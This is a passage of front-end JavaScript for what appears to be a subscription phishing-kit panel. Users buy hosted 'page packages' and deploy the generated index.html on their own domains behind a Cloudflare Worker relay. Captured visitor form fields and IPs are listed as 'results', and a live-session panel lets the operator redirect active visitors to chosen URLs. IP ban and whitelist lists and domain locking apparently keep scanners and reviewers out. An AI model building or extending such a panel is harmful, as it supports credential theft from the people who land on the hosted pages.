          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = `${page.name.toUpperCase()} USER CONFIG READY`;
  topbarTitle.textContent = `${page.name} Config`;
}

function formatTrafficTime(value) {
  if (!value) return "--";
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return String(value).slice(0, 12);
  return date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
}

function formatTrafficDate(value) {
  if (!value) return "unknown date";
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return String(value).slice(0, 16);
  return date.toLocaleDateString([], { month: "short", day: "numeric" });
}

function trafficRowsMarkup(trafficLog, pageSlug, bannedIps = [], whitelistIps = []) {
  if (!trafficLog.length) {
    return `
      <article class="empty-state traffic-empty">
        <h3>No traffic yet</h3>
        <p>Open the live hosted page once, then return here. Visits, screens, allowed/blocked decisions, and IPs will appear in this panel.</p>
      </article>
    `;
  }

  return trafficLog.map((event) => {
    const ip = event.ip || "";
    const isBanned = bannedIps.includes(ip);
    const isWhitelisted = whitelistIps.includes(ip);
    const status = isBanned ? "Banned" : isWhitelisted ? "Whitelisted" : event.result || event.event || "Visit";
    return `
      <div>
        <span>${escapeHtml(formatTrafficTime(event.createdAt || event.time))}</span>
        <strong>${escapeHtml(ip || "unknown ip")}</strong>
        <em class="${isBanned ? "is-banned" : isWhitelisted ? "is-whitelisted" : ""}">${escapeHtml(status)}</em>
        <section class="traffic-actions" aria-label="Traffic IP actions">
          <button type="button" data-traffic-ban-ip="${escapeHtml(ip)}" data-traffic-page="${escapeHtml(pageSlug)}" ${ip && !isBanned ? "" : "disabled"}>Ban</button>
          <button type="button" data-traffic-whitelist-ip="${escapeHtml(ip)}" data-traffic-page="${escapeHtml(pageSlug)}" ${ip && !isWhitelisted ? "" : "disabled"}>Whitelist</button>
        </section>
        <small>${escapeHtml([
          event.event || "page_load",
          event.screen || event.path || "",
          event.hostname || "",
          formatTrafficDate(event.createdAt)
        ].filter(Boolean).join(" / "))}</small>
      </div>
    `;
  }).join("");
}

async function fetchPageTraffic(page) {
  try {
    const result = await requestApi(`/api/user-pages/${encodeURIComponent(page.id)}/traffic?limit=100`);
    return result.trafficEvents || [];
  } catch (error) {
    statusText.textContent = `TRAFFIC LOAD FAILED: ${error.message}`.toUpperCase();
    return page.securityConfig?.trafficLog || [];
  }
}

async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
  activeFlowSlug = null;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  const security = page.securityConfig;
  const turnstile = security.turnstile || {};
  const domains = security.domains || [];
  const bannedIps = security.bannedIps || [];
  const whitelistIps = security.whitelistIps || [];
  const trafficLog = tab === "traffic" ? await fetchPageTraffic(page) : security.trafficLog || [];
  const tabButtons = [
    routeButton(`#security-${page.slug}:security`, "Security", tab === "security" ? "primary" : ""),
    routeButton(`#security-${page.slug}:domains`, "Domains", tab === "domains" ? "primary" : ""),
    routeButton(`#security-${page.slug}:ips`, "IP Rules", tab === "ips" ? "primary" : ""),
    routeButton(`#security-${page.slug}:traffic`, "Traffic", tab === "traffic" ? "primary" : "")
  ];
  const domainPanel = `
    <article class="security-panel">
      <div class="builder-heading">
        <div>
          <small>domains</small>
          <h3>Allowed hosts</h3>
        </div>
        <button type="button" data-save-security="${page.slug}">Save security</button>
      </div>
      <label>
        <span>Allowed domains</span>
        <textarea data-security-field="domains">${domains.join("\n")}</textarea>
      </label>
      <p>Generated files only run on these domains. Keep this list tight once the page is live.</p>
    </article>
  `;
  const captchaPanel = `
    <article class="security-panel">
      <small>captcha</small>
      <h3>Cloudflare Turnstile</h3>
      <label class="toggle-row">
        <input type="checkbox" data-security-field="captcha" ${security.captcha ? "checked" : ""}>
        <span>Enable Turnstile challenge before form submission</span>
      </label>
      <label>
        <span>Turnstile site key</span>
        <input type="text" data-security-field="turnstileSiteKey" value="${escapeHtml(turnstile.siteKey || security.turnstileSiteKey || "")}" placeholder="0x4AAAA...">
      </label>
      <label>
        <span>Turnstile secret key</span>
        <input type="password" data-security-field="turnstileSecretKey" value="${escapeHtml(turnstile.secretKey || security.turnstileSecretKey || "")}" placeholder="Keep this server-side">
      </label>
      <p>The generated index.html receives only the site key. The secret key stays in your API config for verification.</p>
    </article>
  `;
  const ipPanel = `
    <article class="security-panel">
      <small>ip rules</small>
      <h3>Ban and whitelist</h3>
      <label>
        <span>Banned IPs</span>
        <textarea data-security-field="bannedIps">${bannedIps.join("\n")}</textarea>
      </label>
      <label>
        <span>Whitelisted IPs</span>
        <textarea data-security-field="whitelistIps">${whitelistIps.join("\n")}</textarea>
      </label>
      <button type="button" data-save-security="${page.slug}">Save IP rules</button>
    </article>
  `;
  const trafficPanel = `
    <article class="security-panel security-panel-wide">
      <div class="builder-heading">
        <div>
          <small>traffic</small>
          <h3>Recent visits</h3>
        </div>
        <button type="button" data-route="#security-${page.slug}:traffic">Refresh</button>
      </div>
      <div class="metric-grid">
        <div><span>Total events</span><b>${trafficLog.length}</b></div>
        <div><span>Allowed</span><b>${trafficLog.filter((event) => event.result !== "blocked").length}</b></div>
        <div><span>Blocked</span><b>${trafficLog.filter((event) => event.result === "blocked").length}</b></div>
      </div>
      <div class="traffic-log">
        ${trafficRowsMarkup(trafficLog, page.slug, bannedIps, whitelistIps)}
      </div>
    </article>
  `;
  const panels = tab === "traffic"
    ? trafficPanel
    : tab === "domains"
      ? `${domainPanel}${captchaPanel}`
      : tab === "ips"
        ? `${ipPanel}${trafficPanel}`
        : `${domainPanel}${captchaPanel}${ipPanel}${trafficPanel}`;

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>security center</small>
        <h2>${page.name} protection</h2>
        <p>Manage the rules that protect this page after users download and host the generated index.html.</p>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#results-${page.slug}`, "Results"),
        routeButton("#wallet", "Wallet")
      ])}
      ${viewNav(tabButtons)}

      <div class="security-grid">
        ${panels}
      </div>
    </section>
  `;

  statusText.textContent = `${tab.toUpperCase()} RULES READY`;
  topbarTitle.textContent = `${page.name} Security`;
}

async function renderResultsCenter(pageSlug = "page-a") {
  activeFlowSlug = null;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  await loadResultsControlData(page);
  const results = page.results || [];
  const activeSessions = page.activeSessions || [];
  const sessionCommands = page.configs?.sessionCommands || {};
  const bannedIps = page.securityConfig?.bannedIps || [];
  const whitelistIps = page.securityConfig?.whitelistIps || [];

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>page results</small>
        <h2>${page.name} submissions</h2>
        <p>Watch active visitors on this page, redirect a live session when needed, and manage saved submissions without leaving the page workspace.</p>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#security-${page.slug}:security`, "Security"),
        routeButton("#wallet", "Wallet")
      ])}

      <div class="summary-grid">
        <article><small>Active users</small><b>${String(activeSessions.length).padStart(2, "0")}</b><span>Seen in last 10 minutes</span></article>
        <article><small>Total results</small><b>${String(results.length).padStart(2, "0")}</b><span>Saved for ${page.name}</span></article>
        <article><small>Banned IPs</small><b>${String(bannedIps.length).padStart(2, "0")}</b><span>Security list</span></article>
        <article><small>Whitelisted</small><b>${String(whitelistIps.length).padStart(2, "0")}</b><span>Trusted list</span></article>
      </div>

      <article class="security-panel active-users-panel">
        <div class="builder-heading">
          <div>
            <small>live users</small>
            <h3>Active page sessions</h3>
          </div>
          <button type="button" data-route="#security-${page.slug}:traffic">Open traffic</button>
        </div>
        <div class="active-session-list">
          ${activeSessions.length ? activeSessions.map((session) => {
            const command = sessionCommands[session.sessionId];
            return `
              <article class="active-session-card">
                <div>
                  <small>${escapeHtml(session.event || "page_load")} / ${escapeHtml(session.result || "allowed")}</small>
                  <h4>${escapeHtml(session.ip || "unknown")}</h4>
                  <p>${escapeHtml(session.screen || "page")} ${session.path ? `/ ${escapeHtml(session.path)}` : ""}</p>
                </div>
                <div class="session-meta">
                  <span>${escapeHtml(formatTrafficTime(session.lastSeenAt))}</span>
                  <span>${command?.targetUrl ? `Queued: ${escapeHtml(command.targetUrl)}` : "No command"}</span>
                </div>
                <div class="session-command">
                  <input type="url" placeholder="https://target-page.com" value="${escapeHtml(command?.targetUrl || "")}" data-session-target="${escapeHtml(session.sessionId)}">
                  <button type="button" data-session-redirect="${escapeHtml(session.sessionId)}" data-session-page="${escapeHtml(page.slug)}">Redirect</button>
                  <button type="button" data-session-clear="${escapeHtml(session.sessionId)}" data-session-page="${escapeHtml(page.slug)}">Clear</button>
                </div>
              </article>
            `;
          }).join("") : `
            <article class="active-session-card empty-session">
              <div>
                <small>idle</small>
                <h4>No active users right now</h4>
                <p>Open the live page and keep it active; sessions appear here from recent traffic events.</p>
              </div>
            </article>
          `}
        </div>
      </article>

      <div class="results-list">
        ${results.length ? results.map((result) => `
          <article class="result-card">
            <div class="result-head">
              <div>
                <small>${escapeHtml(result.status)}</small>
                <h3>${escapeHtml(result.screen)}</h3>
              </div>
              <span>${escapeHtml(result.date)} / ${escapeHtml(result.time)}</span>
            </div>
            <div class="result-meta">
              <span>IP ${escapeHtml(result.ip)}</span>
              <span>${bannedIps.includes(result.ip) ? "Banned" : whitelistIps.includes(result.ip) ? "Whitelisted" : "Unsorted"}</span>
            </div>
            <div class="result-fields">
              ${Object.entries(result.fields || {}).map(([label, value]) => `
                <div>
                  <span>${escapeHtml(label)}</span>
                  <strong>${escapeHtml(value)}</strong>
                </div>
              `).join("")}
            </div>
            <div class="result-actions">
              <button type="button" data-view-result="${result.id}" data-result-page="${page.slug}">&#128269; View</button>
              <button type="button" data-ban-result-ip="${result.id}" data-result-page="${page.slug}">&#128683; Ban IP</button>
              <button type="button" data-whitelist-result-ip="${result.id}" data-result-page="${page.slug}">&#9989; Whitelist</button>
              <button type="button" data-delete-result="${result.id}" data-result-page="${page.slug}">&#128465; Delete</button>
            </div>
          </article>
        `).join("") : `
          <article class="security-panel">
            <small>empty</small>
            <h3>No saved results yet</h3>
            <p>When a hosted index.html sends data to your Render API, the results will appear here under the matching owned page.</p>
          </article>
        `}
      </div>
    </section>
  `;

  statusText.textContent = `${page.name.toUpperCase()} RESULTS READY`;
  topbarTitle.textContent = `${page.name} Results`;
}

function renderWallet() {
  activeFlowSlug = null;
  const transactions = walletData.transactions || [];
  const activeRenewals = ownedPages.filter((page) => page.subscription?.autoRenew);
  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>wallet / subscription</small>
        <h2>Wallet and renewals</h2>
        <p>Users keep funds in their wallet and spend that balance on subscriptions, renewals, downloads, and premium actions.</p>
      </div>
      <div class="wallet-grid">
        <article class="wallet-balance">
          <small>available wallet balance</small>
          <strong>${formatMoney(walletData.balance)}</strong>
          <p>This balance pays for new subscriptions, recurring renewals, and paid actions inside the app.</p>
          <div class="wallet-actions">
            <button type="button">Add funds</button>
            <button type="button">${activeRenewals.length ? "Auto-renew on" : "No renewals"}</button>
          </div>
        </article>
        <article class="wallet-panel">
          <small>billing periods</small>
          <div class="pricing-grid">
            <span>Daily</span>
            <span>Weekly from $25</span>
            <span>Biweekly</span>
            <span>Monthly</span>
          </div>
          <p>Each page can renew on its own billing period using wallet funds.</p>
        </article>
      </div>
      <div class="owned-page-card">
        <div>
          <small>active renewals</small>
          <h3>${activeRenewals.length} page subscriptions funded by wallet</h3>
          <p>${activeRenewals.length ? "Low-balance alerts appear before renewal." : "Subscribe to a page and enable auto-renew to see renewal records here."}</p>
        </div>
        <button type="button">Manage renewals</button>
      </div>
      <div class="activity-list">
        ${transactions.length ? transactions.map((transaction) => `
          <article><span>${escapeHtml(transaction.description || transaction.type)}</span><strong>${formatMoney(transaction.amount)}</strong></article>
        `).join("") : emptyState("No wallet activity", "Wallet transactions will appear here after deposits, subscriptions, and renewals.", "#pages")}
      </div>
    </section>
  `;
  statusText.textContent = "SUBSCRIPTION VAULT ONLINE";
  topbarTitle.textContent = "Wallet / Subscription";
}

function renderRoute() {
  const hash = window.location.hash || (isLoggedIn() ? "#dashboard" : "#login");
  const publicRoutes = ["#login", "#signup"];
  syncAdminVisibility();

  if (!isLoggedIn() && !publicRoutes.includes(hash)) {
    setActiveNav("#dashboard");
    renderLogin();
    return;
  }

  if (isLoggedIn() && publicRoutes.includes(hash)) {
    window.location.hash = "#dashboard";
    return;
  }

  setAuthLayout(false);
  if (isAdminRoute(hash) && !isAdmin()) {
    window.location.hash = "#dashboard";
    statusText.textContent = "ADMIN ACCESS REQUIRED";
    return;
  }

  setActiveNav(["#pages", "#admin", "#my-pages", "#wallet"].includes(hash) ? hash : "#dashboard");

  if (hash === "#login") {
    setActiveNav("#dashboard");
    renderLogin();
    return;
  }

  if (hash === "#signup") {
    setActiveNav("#dashboard");
    renderSignup();
    return;
  }

  if (hash === "#pages") {
    renderPages();
    return;
  }

  if (hash === "#admin") {
    renderAdmin();
    return;
  }

  if (hash === "#admin-users") {
    setActiveNav("#admin");
    renderAdminUsers();
    return;
  }

  if (hash.startsWith("#admin-import-")) {
    setActiveNav("#admin");
    renderAdminImportWizard(hash.replace("#admin-import-", ""));
    return;
  }

  if (hash.startsWith("#admin-package-")) {
    setActiveNav("#admin");
    renderAdminPackageEditor(hash.replace("#admin-package-", ""));
    return;
  }

  if (hash.startsWith("#flow-")) {
    setActiveNav("#my-pages");
    window.location.hash = "#my-pages";
    statusText.textContent = "PAGE BUILDER REMOVED";
    return;
  }

  if (hash.startsWith("#config-")) {
    setActiveNav("#my-pages");
    renderUserConfigCenter(hash.replace("#config-", ""));
    return;
  }

  if (hash.startsWith("#go-live-")) {
    setActiveNav("#my-pages");
    renderGoLiveCenter(hash.replace("#go-live-", ""));
    return;
  }

  if (hash.startsWith("#security-")) {
    setActiveNav("#my-pages");
    const [pageSlug, tab = "security"] = hash.replace("#security-", "").split(":");
    renderSecurityCenter(pageSlug, tab);
    return;
  }

  if (hash.startsWith("#results-")) {
    setActiveNav("#my-pages");
    renderResultsCenter(hash.replace("#results-", ""));
    return;
  }

  if (["#my-pages", "#domains", "#security", "#traffic", "#settings"].includes(hash)) {
    setActiveNav("#my-pages");
    renderMyPages();
    return;
  }

  if (hash === "#wallet") {
    renderWallet();
    return;
  }

  renderDashboard();
}

if (copyButton) {
  copyButton.addEventListener("click", async () => {
    const markup = document.querySelector(`#${activeTemplate.id}`).innerHTML.trim();
    await navigator.clipboard.writeText(markup);
    statusText.textContent = "TEMPLATE MARKUP COPIED";
    window.setTimeout(() => {
      statusText.textContent = activeTemplate.status;
    }, 1600);
  });
}

if (randomButton) {
  randomButton.addEventListener("click", () => {
    const pool = templates.filter((template) => template.id !== activeTemplate.id);
    const next = pool[Math.floor(Math.random() * pool.length)];
    setTemplate(next);
  });
}

swatches.addEventListener("click", (event) => {
  const swatch = event.target.closest(".swatch");
  if (!swatch) return;

  setAccentColor(swatch.dataset.accent, true);
});

themeToggle.addEventListener("click", () => {
  const root = document.documentElement;
  const isLight = root.dataset.theme === "light";
  setThemeMode(isLight ? "dark" : "light", true);
});

document.querySelector("[data-logout]")?.addEventListener("click", handleLogout);

function saveSecurityConfig(page) {
  const domainsField = preview.querySelector('[data-security-field="domains"]');
  const captchaField = preview.querySelector('[data-security-field="captcha"]');
  const turnstileSiteKeyField = preview.querySelector('[data-security-field="turnstileSiteKey"]');
  const turnstileSecretKeyField = preview.querySelector('[data-security-field="turnstileSecretKey"]');
  const bannedField = preview.querySelector('[data-security-field="bannedIps"]');
  const whitelistField = preview.querySelector('[data-security-field="whitelistIps"]');
  const current = page.securityConfig || {};
  const currentTurnstile = current.turnstile || {};

  page.securityConfig = {
    ...current,
    domains: domainsField ? domainsField.value.split(/\n|,/).map((item) => item.trim()).filter(Boolean) : current.domains || [],
    captcha: captchaField ? captchaField.checked : Boolean(current.captcha),
    turnstile: {
      provider: "turnstile",
      siteKey: turnstileSiteKeyField ? turnstileSiteKeyField.value.trim() : currentTurnstile.siteKey || current.turnstileSiteKey || "",
      secretKey: turnstileSecretKeyField ? turnstileSecretKeyField.value.trim() : currentTurnstile.secretKey || current.turnstileSecretKey || ""
    },
    bannedIps: bannedField ? bannedField.value.split(/\n|,/).map((item) => item.trim()).filter(Boolean) : current.bannedIps || [],
    whitelistIps: whitelistField ? whitelistField.value.split(/\n|,/).map((item) => item.trim()).filter(Boolean) : current.whitelistIps || []
  };
  saveFlowState(page);
  renderSecurityCenter(page.slug);
  statusText.textContent = "SECURITY SETTINGS SAVED";
}

function saveUserConfig(page) {
  const getField = (name) => preview.querySelector(`[data-user-config="${name}"]`);
  const domain = getField("domain").value.trim() || page.domain;

  page.domain = domain;
  page.subscription = {
    ...(page.subscription || {}),
    billingPeriod: getField("billingPeriod").value,
    renewalPrice: Number(getField("renewalPrice").value || 0),
    renewalDate: getField("renewalDate").value,
    autoRenew: getField("autoRenew").checked
  };
  page.generatedFile = {
    ...(page.generatedFile || {}),
    apiBase: getField("apiBase").value.trim() || "https://your-render-app.onrender.com",
    downloadName: getField("downloadName").value.trim() || `${page.slug}-index.html`,
    version: getField("fileVersion").value.trim() || page.generatedFile?.version || "build-001"
  };
  page.resultSettings = {
    ...(page.resultSettings || {}),
    webhook: getField("webhook").value.trim() || "/api/page-results",
    retentionDays: Number(getField("retentionDays").value || 30),
    notifyOnResult: getField("notifyOnResult").checked
  };
  page.securityConfig = {
    ...(page.securityConfig || {}),
    domains: domain ? [domain] : []
  };

  saveFlowState(page);
  renderUserConfigCenter(page.slug);
  statusText.textContent = `${page.name.toUpperCase()} USER CONFIG SAVED`;
}

function collectHostingFields(page) {
  const field = (name) => preview.querySelector(`[data-hosting-field="${name}"]`)?.value.trim() || "";
  const selectedHostingType = field("hostingType") || "render-static-site";
  return {
    domain: field("domain") || page.domain,
    serverIp: field("serverIp"),
    connectionType: field("connectionType") || "cloudflare-worker",
    hostingType: selectedHostingType,
    installPath: field("installPath") || (selectedHostingType === "render-static-site" ? "root / public directory" : "public_html"),
    relayTarget: page.hostingConfig?.relayTarget || apiBase(),
    relaySecret: page.hostingConfig?.relaySecret || ""
  };
}

function saveHostingConfig(page, verify = false) {
  const hosting = collectHostingFields(page);
  const hasRelay = hosting.connectionType === "cloudflare-worker";
  const isRenderStatic = hosting.hostingType === "render-static-site";
  const needsOrigin = !hasRelay && !isRenderStatic;
  const hasMinimumConfig = Boolean(hosting.domain && (hasRelay ? hosting.relaySecret : needsOrigin ? hosting.serverIp : true));

  page.domain = hosting.domain;
  page.hostingConfig = {
    ...(page.hostingConfig || {}),
    ...hosting,
    verified: verify ? hasMinimumConfig : Boolean(page.hostingConfig?.verified && hasMinimumConfig),
    verifiedAt: verify && hasMinimumConfig ? new Date().toISOString() : page.hostingConfig?.verifiedAt || null,
    relayVerified: verify && hasRelay && hasMinimumConfig ? true : Boolean(page.hostingConfig?.relayVerified && hasMinimumConfig),
    relayVerifiedAt: verify && hasRelay && hasMinimumConfig ? new Date().toISOString() : page.hostingConfig?.relayVerifiedAt || null,
    workerRoute: hosting.domain ? `${hosting.domain}/api/*` : "",
    liveStatus: verify && hasMinimumConfig ? "Live" : hasMinimumConfig ? "Ready to verify" : "Setup required"
  };
  page.securityConfig = {
    ...(page.securityConfig || {}),
    domains: hosting.domain ? [hosting.domain] : []
  };
  page.generatedFile = {
    ...(page.generatedFile || {}),
    apiBase: hosting.connectionType === "cloudflare-worker" ? "/api" : hosting.relayTarget,
    lastGeneratedAt: page.generatedFile?.lastGeneratedAt || null
  };

  saveFlowState(page);
  renderGoLiveCenter(page.slug);
  statusText.textContent = verify
    ? hasMinimumConfig ? "HOSTING CONNECTION VERIFIED" : "DOMAIN AND SERVER IP REQUIRED"
    : "HOSTING SETTINGS SAVED";
}

function generateRelaySecretForPage(page) {
  if (!page) return;
  const hosting = collectHostingFields(page);
  page.hostingConfig = {
    ...(page.hostingConfig || {}),
    ...hosting,
    connectionType: hosting.connectionType || "cloudflare-worker",
    relaySecret: generateRelaySecret(),
    relayVerified: false,
    workerRoute: hosting.domain ? `${hosting.domain}/api/*` : ""
  };
  page.generatedFile = {
    ...(page.generatedFile || {}),
    apiBase: page.hostingConfig.connectionType === "cloudflare-worker" ? "/api" : page.hostingConfig.relayTarget
  };
  saveFlowState(page);
  renderGoLiveCenter(page.slug);
  statusText.textContent = "CLOUDFLARE RELAY SECRET GENERATED";
}

function collectCloudflareFields(page) {
  const field = (name) => preview.querySelector(`[data-cloudflare-field="${name}"]`)?.value.trim() || "";
  return {
    domain: page.hostingConfig?.domain || page.domain,
    accountId: field("accountId"),
    apiToken: field("apiToken"),
    scriptName: field("scriptName")
  };
}

async function verifyCloudflareForPage(page) {
  if (!page) return;
  const payload = collectCloudflareFields(page);
  if (!payload.domain || !payload.apiToken) {
    statusText.textContent = "DOMAIN AND CLOUDFLARE TOKEN REQUIRED";
    return;
  }
  statusText.textContent = "VERIFYING CLOUDFLARE ZONE";
  try {
    const result = await requestApi(`/api/user-pages/${page.id}/cloudflare/verify`, {
      method: "POST",
      body: JSON.stringify(payload)
    });
    const updated = normalizeUserPage(result.userPage);
    ownedPages = ownedPages.map((item) => item.id === updated.id ? updated : item);
    renderGoLiveCenter(updated.slug);
    statusText.textContent = "CLOUDFLARE ZONE VERIFIED";
  } catch (error) {
    statusText.textContent = `CLOUDFLARE VERIFY FAILED: ${error.message}`.toUpperCase();
  }
}

async function installCloudflareForPage(page) {
  if (!page) return;
  const payload = collectCloudflareFields(page);
  if (!payload.domain || !payload.accountId || !payload.apiToken) {
    statusText.textContent = "DOMAIN, ACCOUNT ID, AND CLOUDFLARE TOKEN REQUIRED";
    return;
  }
  if (!page.hostingConfig?.relaySecret) {
    statusText.textContent = "GENERATE RELAY SECRET FIRST";
    return;
  }
  statusText.textContent = "INSTALLING CLOUDFLARE WORKER";
  try {
    const result = await requestApi(`/api/user-pages/${page.id}/cloudflare/install`, {
      method: "POST",
      body: JSON.stringify(payload)
    });
    const updated = normalizeUserPage(result.userPage);
    ownedPages = ownedPages.map((item) => item.id === updated.id ? updated : item);
    renderGoLiveCenter(updated.slug);
    statusText.textContent = "CLOUDFLARE WORKER INSTALLED";
  } catch (error) {
    statusText.textContent = `CLOUDFLARE INSTALL FAILED: ${error.message}`.toUpperCase();
  }
}

function collectGithubImportFields() {
  const field = (name) => preview.querySelector(`[data-github-field="${name}"]`)?.value.trim() || "";
  return {
    repoUrl: field("repoUrl"),
    branch: field("branch"),
    folder: field("folder"),
    packageName: field("packageName") || "GitHub Imported Page",
    slug: field("slug") || "github-imported-page"
  };
}

function githubFileUrl(scan, filePath, mode = "blob") {
  const base = mode === "raw"
    ? `https://raw.githubusercontent.com/${scan.owner}/${scan.repo}/${scan.branch}`
    : `https://github.com/${scan.owner}/${scan.repo}/blob/${scan.branch}`;
  return `${base}/${scan.folder ? `${scan.folder}/` : ""}${filePath.replace(`${scan.folder}/`, "")}`;
}

function githubPreviewUrl(scan, filePath) {
  const params = new URLSearchParams({
    repoUrl: scan.repoUrl,
    branch: scan.branch,
    file: filePath
  });
  return `${apiBase()}/api/admin/import/github/preview?${params.toString()}`;
}

function packagePreviewUrl(pagePackage) {
  if (!pagePackage.previewToken) return "";
  return `${apiBase()}/preview/${encodeURIComponent(pagePackage.previewToken)}`;
}

function packageAssetUrl(pagePackage, filePath) {
  if (!pagePackage.previewToken || !filePath) return "";
  const params = new URLSearchParams({ file: filePath });
  return `${apiBase()}/preview/${encodeURIComponent(pagePackage.previewToken)}/asset?${params.toString()}`;
}

function pageInitials(name) {
  const initials = String(name || "PG")
    .trim()
    .split(/\s+/)
    .map((part) => part.charAt(0))
    .join("")
    .slice(0, 2)
    .toUpperCase();
  return initials || "PG";
}

function pageIconMarkup(pagePackage) {
  const thumbnailUrl = packageAssetUrl(pagePackage, pagePackage.thumbnailPath);
  const fallback = `<span class="market-icon-fallback">${escapeHtml(pageInitials(pagePackage.name))}</span>`;
  if (!thumbnailUrl) return `<span class="market-icon">${fallback}</span>`;
  return `
    <span class="market-icon has-image">
      <img src="${escapeHtml(thumbnailUrl)}" alt="${escapeHtml(pagePackage.name)} favicon" loading="lazy" onerror="this.remove()">
      ${fallback}
    </span>
  `;
}

function updateMarketPlanCard(select) {
  const pagePackage = marketPages.find((item) => item.slug === select.dataset.marketPlan);
  if (!pagePackage) return;
  selectedMarketPlans[pagePackage.slug] = select.value;
  const card = select.closest(".market-card");
  const priceLabel = card?.querySelector(`[data-market-price="${pagePackage.slug}"]`);
  const subscribeButton = card?.querySelector(`[data-market-subscribe="${pagePackage.slug}"]`);
  if (priceLabel) priceLabel.textContent = marketPriceLabel(pagePackage, select.value);
  if (subscribeButton) subscribeButton.textContent = marketSubscribeLabel(pagePackage, select.value);
}

async function subscribeToMarketPackage(button) {
  if (!isLoggedIn()) {
    window.location.hash = "#login";
    statusText.textContent = "LOGIN REQUIRED TO SUBSCRIBE";
    return;
  }

  await refreshAuthUser();

  const pagePackage = marketPages.find((item) => item.slug === button.dataset.marketSubscribe);
  if (!pagePackage) {
    statusText.textContent = "PAGE PACKAGE NOT FOUND";
    return;
  }

  const period = selectedBillingPeriod(pagePackage);
  const price = billingPrice(pagePackage, period);
  const originalLabel = button.textContent;
  button.disabled = true;
  button.textContent = "Subscribing...";
  statusText.textContent = `SUBSCRIBING TO ${pagePackage.name.toUpperCase()}`;

  try {
    await requestApi(`/api/packages/${pagePackage.slug}/subscribe`, {
      method: "POST",
      body: JSON.stringify({ billingPeriod: period })
    });
    await loadAppData();
    window.location.hash = "#my-pages";
    window.setTimeout(() => {
      statusText.textContent = isAdmin()
        ? `${pagePackage.name.toUpperCase()} ADMIN SUBSCRIPTION ACTIVE`
        : `${pagePackage.name.toUpperCase()} ${billingLabel(period).toUpperCase()} SUBSCRIPTION ACTIVE`;
    }, 50);
  } catch (error) {
    button.disabled = false;
    button.textContent = originalLabel;
    if (error.status === 402) {
      if (isAdmin()) {
        statusText.textContent = "ADMIN FREE ACCESS NOT ACTIVE ON API. RESTART SERVER AND TRY AGAIN";
        return;
      }
      const required = formatMoney(error.data?.price || price);
      const balance = formatMoney(error.data?.walletBalance || walletData.balance || 0);
      statusText.textContent = `WALLET TOO LOW: ${balance} AVAILABLE, ${required} REQUIRED`;
      window.setTimeout(() => {
        window.location.hash = "#wallet";
      }, 700);
      return;
    }
    if (error.status === 401) {
      window.location.hash = "#login";
      statusText.textContent = "LOGIN REQUIRED TO SUBSCRIBE";
      return;
    }
    statusText.textContent = `SUBSCRIPTION FAILED: ${error.message}`.toUpperCase();
  }
}

function renderGithubImportResult(scan, pagePackage) {
  const resultPanel = preview.querySelector("[data-github-result]");
  if (!resultPanel) return;
  const htmlScreens = scan.screens || [];
  const cssFiles = scan.cssFiles || [];
  const assets = scan.assets || [];
  const firstPreviewUrl = htmlScreens[0] ? githubPreviewUrl(scan, htmlScreens[0].file) : "";

  resultPanel.innerHTML = `
    <code>${pagePackage ? `${pagePackage.status === "published" ? "Published" : "Draft"} package ready: ${pagePackage.name} (${pagePackage.slug})` : `Connected: ${scan.owner}/${scan.repo}`}</code>
    <code>Branch: ${scan.branch}${scan.folder ? ` / folder: ${scan.folder}` : ""}</code>
    <code>Files: ${scan.summary.totalFiles} total / ${scan.summary.html} HTML / ${scan.summary.css} CSS / ${scan.summary.assets} assets</code>
    <div class="github-preview-panel">
      <div>
        <strong>Screen preview</strong>
        ${htmlScreens.length ? htmlScreens.map((screen, index) => `
          <button type="button" data-github-preview-url="${escapeHtml(githubPreviewUrl(scan, screen.file))}" data-github-raw-url="${escapeHtml(githubFileUrl(scan, screen.file, "raw"))}" data-github-preview-name="${escapeHtml(screen.name)}">
            ${String(index + 1).padStart(2, "0")} ${escapeHtml(screen.name)} - ${escapeHtml(screen.file)}
          </button>
        `).join("") : "<span>No HTML screens found yet.</span>"}
      </div>
      <div>
        <strong>CSS and assets</strong>
        <span>${cssFiles.length ? cssFiles.map((file) => escapeHtml(file)).join(" / ") : "No CSS files detected"}</span>
        <span>${assets.length} asset files detected</span>
      </div>
    </div>
    ${firstPreviewUrl ? `
      <div class="github-iframe-shell">
        <div>
          <strong data-github-preview-title>Previewing ${escapeHtml(htmlScreens[0].name)}</strong>
          <a href="${escapeHtml(githubFileUrl(scan, htmlScreens[0].file, "raw"))}" target="_blank" rel="noopener" data-github-preview-open>Open raw</a>
        </div>
        <iframe title="GitHub page preview" src="${escapeHtml(firstPreviewUrl)}" data-github-preview-frame sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
      </div>
    ` : ""}
    <code>Review these files before clicking Import & Publish.</code>
  `;
}

async function scanGithubImport(mode = "scan", triggerButton = null) {
  const createPackageRecord = mode === "draft" || mode === "publish";
  const payload = {
    ...collectGithubImportFields(),
    publish: mode === "publish"
  };
  const endpoint = createPackageRecord ? "/api/admin/import/github/package" : "/api/admin/import/github/scan";
  const resultPanel = preview.querySelector("[data-github-result]");
  const originalLabel = triggerButton?.textContent || "";

  if (!payload.repoUrl) {
    if (resultPanel) {
      resultPanel.innerHTML = `<code>Repository URL is required.</code><code>Paste a GitHub repo URL, then scan again.</code>`;
    }
    statusText.textContent = "GITHUB REPOSITORY URL REQUIRED";
    return;
  }

  if (resultPanel) {
    resultPanel.innerHTML = `
      <code>Checking API connection...</code>
      <code>${escapeHtml(apiBase())}/api/health</code>
    `;
  }
  if (triggerButton) {
    triggerButton.disabled = true;
    triggerButton.textContent = "Checking API...";
  }
  statusText.textContent = "VERIFYING API CONNECTION";

  try {
    const connection = await checkAdminApiConnection();
    if (!connection.ok) {
      if (resultPanel) {
        resultPanel.innerHTML = `
          <code>${escapeHtml(connection.title)}</code>
          <code>${escapeHtml(connection.detail)}</code>
          <code>Backend connection is managed by the app.</code>
